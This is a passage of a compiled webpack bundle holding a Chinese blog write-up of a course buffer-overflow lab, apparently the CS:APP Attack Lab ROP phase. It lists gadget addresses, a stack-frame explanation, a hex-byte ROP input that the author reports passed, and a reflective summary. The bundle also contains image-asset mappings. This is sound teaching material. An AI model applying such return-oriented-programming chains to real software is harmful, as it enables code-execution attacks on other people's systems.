%esi\nret\n\n#\u5730\u5740\uff1a0x4019d6\nlea    (%rdi,%rsi,1),%rax\nret\n\n#\u5730\u5740\uff1a0x4019a2\nmovq %rax, %rdi\nret\n")),(0,l.kt)("h3",{id:"\u6808\u5e27\u8bb2\u89e3-3"},"\u6808\u5e27\u8bb2\u89e3"),(0,l.kt)("p",null,"\u4e3a\u8282\u7701\u7a7a\u95f4\uff0c\u6bcf\u4e00\u884c\u4ee3\u7801\u90fd\u7701\u7565\u4e86\u540e\u9762\u7684",(0,l.kt)("inlineCode",{parentName:"p"},"ret"),"\uff0c"),(0,l.kt)("p",null,(0,l.kt)("img",{src:n(48328).Z,width:"1132",height:"796"})),(0,l.kt)("p",null,"\u903b\u8f91\u5728\u56fe\u4e0a\u6807\u7684\u5f88\u6e05\u695a\uff0c\u8fd9\u91cc\u5c31\u4e0d\u518d\u7528\u6587\u5b57\u5199\u5566\uff01"),(0,l.kt)("p",null,(0,l.kt)("strong",{parentName:"p"},"\u8981\u6ce8\u610f"),"\uff0c",(0,l.kt)("inlineCode",{parentName:"p"},"getbuf"),"\u6267\u884c",(0,l.kt)("inlineCode",{parentName:"p"},"ret"),"\u540e\u76f8\u5f53\u4e8e\u8fdb\u884c\u4e86\u4e00\u6b21",(0,l.kt)("inlineCode",{parentName:"p"},"pop"),"\u64cd\u4f5c\uff0c",(0,l.kt)("inlineCode",{parentName:"p"},"test"),"\u7684\u6808\u9876\u6307\u9488",(0,l.kt)("inlineCode",{parentName:"p"},"%rsp=%rsp+0x8"),"\uff0c\u6240\u4ee5",(0,l.kt)("inlineCode",{parentName:"p"},"cookie"),"\u76f8\u5bf9\u4e8e\u6b64\u65f6\u6808\u9876\u6307\u9488\u7684\u504f\u79fb\u91cf\u662f",(0,l.kt)("inlineCode",{parentName:"p"},"0x48"),"\u800c\u4e0d\u662f",(0,l.kt)("inlineCode",{parentName:"p"},"0x50")),(0,l.kt)("h3",{id:"solution-4"},"Solution"),(0,l.kt)("p",null,"\u6839\u636e\u4e0a\u56fe\u7684\u6808\u5e27\uff0c\u5199\u51fa\u8f93\u5165\u5e8f\u5217\uff1a"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-shell"},"00 00 00 00 00 00 00 00 \n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00 \n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00 \nad 1a 40 00 00 00 00 00 \na2 19 40 00 00 00 00 00 \ncc 19 40 00 00 00 00 00 \n48 00 00 00 00 00 00 00 \ndd 19 40 00 00 00 00 00 \n70 1a 40 00 00 00 00 00 \n13 1a 40 00 00 00 00 00 \nd6 19 40 00 00 00 00 00 \na2 19 40 00 00 00 00 00 \nfa 18 40 00 00 00 00 00 \n35 39 62 39 39 37 66 61\n")),(0,l.kt)("p",null,(0,l.kt)("img",{src:n(63209).Z,width:"964",height:"384"})),(0,l.kt)("p",null,(0,l.kt)("strong",{parentName:"p"},"Pass! \u653b\u51fb\u6210\u529f\uff01")),(0,l.kt)("h2",{id:"\u603b\u7ed3"},"\u603b\u7ed3"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"\u672c\u5b9e\u9a8c\u6d89\u53ca\u7684\u5185\u5bb9\u5728\u8bfe\u672c\u4e2d\u53ea\u6709\u77ed\u77ed\u51e0\u9875\u7684\u7bc7\u5e45\uff0c\u800c\u5b9e\u9645\u64cd\u4f5c\u4e2d\u5374\u8981\u8003\u8651\u5982\u6b64\u591a\u7684\u4e1c\u897f\uff0c\u786e\u5b9e\u662f\u90a3\u53e5\u8bdd\u201c\u7eb8\u4e0a\u5f97\u6765\u7ec8\u89c9\u6d45\uff0c\u7edd\u77e5\u6b64\u4e8b\u8981\u8eac\u884c\u201d\u3002\u4e94\u4e2a",(0,l.kt)("inlineCode",{parentName:"li"},"Phase"),"\u7684\u96be\u5ea6\u662f\u5c42\u5c42\u9012\u8fdb\u7684\uff0c",(0,l.kt)("inlineCode",{parentName:"li"},"Part 1"),"\u8ba9\u6211\u5bf9\u90e8\u5206\u6c47\u7f16\u6307\u4ee4\u4ee5\u53ca\u6808\u7684\u539f\u7406\u6709\u4e86\u66f4\u6df1\u7684\u9886\u609f\uff1b",(0,l.kt)("inlineCode",{parentName:"li"},"Part 2"),"\u53ef\u80fd\u5c31\u66f4\u52a0\u8d34\u5408\u5b9e\u9645\u5de5\u7a0b\u9879\u76ee\u4e86\uff0c\u6211\u5728\u8fd9\u91cc\u521d\u6b65\u5b66\u4e60\u4e86\u201cROP\u201d\u8fd9\u4e00\u5929\u624d\u7684\u653b\u51fb\u6280\u672f\uff0c\u5b9e\u73b0\u6210\u529f\u7684\u653b\u51fb\u9700\u8981\u5bf9\u6bcf\u4e00\u4e2a\u5b57\u8282\u90fd\u80fd\u6709\u8db3\u591f\u7684\u654f\u611f\u3002\u540c\u65f6\uff0c\u5728\u6211\u4ee5\u540e\u7f16\u5199\u7684\u4ee3\u7801\u4e2d\uff0c\u4e5f\u5e94\u8be5\u6ce8\u610f\u5230\u7f13\u51b2\u533a\u6ea2\u51fa\u7684\u95ee\u9898"),(0,l.kt)("li",{parentName:"ul"},"\u672c\u5b9e\u9a8c\u8017\u65f62\u5929\uff0c\u7ea69\u5c0f\u65f6")))}m.isMDXComponent=!0},42291:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/image-20220303225536519-16608125438811-0e9aa5d00a74afe2ad00b82649f6280d.png"},55892:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/image-20220304093523423-16608125586917-3bff4547fcbe410f900d7fed96e0b341.png"},85106:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/image-20220304175128141-166081256401410-e50929e409088ff68d8444a5b06247b6.png"},7123:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/image-20220304233752252-f8700637c69e59b26638b67e08a8a34e.png"},44135:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/image-20220305094755965-6d5d71adb6435d46b8ba320bc6facbb7.png"},89253:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/image-20220305095612188-16608125542844-1a1cf4178d9415d400932513295767d2.png"},77532:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/image-20220305095954954-166081256744113-7e2e205b58faed75ce4d085b6c863781.png"},78103:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/image-20220305101326911-a1ce335c66668dda7b90d05d53c5fb14.png"},57626:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/image-20220305102649568-98a7d1a63342d7044f4d3af20f445184.png"},69374:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/image-20220305135105263-434515b53993d4b3d8c79a2aac20af43.png"},15895:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/image-20220305141735521-d3d00d5da7f6dcbbbd0e690101d14405.png"},49252:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/image-20220305153502546-0fc7dc56ba969e07a9f6e623706b695e.png"},26124:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/image-20220305161143538-4e6caf5df6bdd9f670c89d9899c9a260.png"},48328:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/image-20220305192432219-0225dd9cbad8045ee450baf8c1529413.png"},63209:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/image-20220305193301330-9d9066651b1a1781cc6a46e1c53531e2.png"}}]);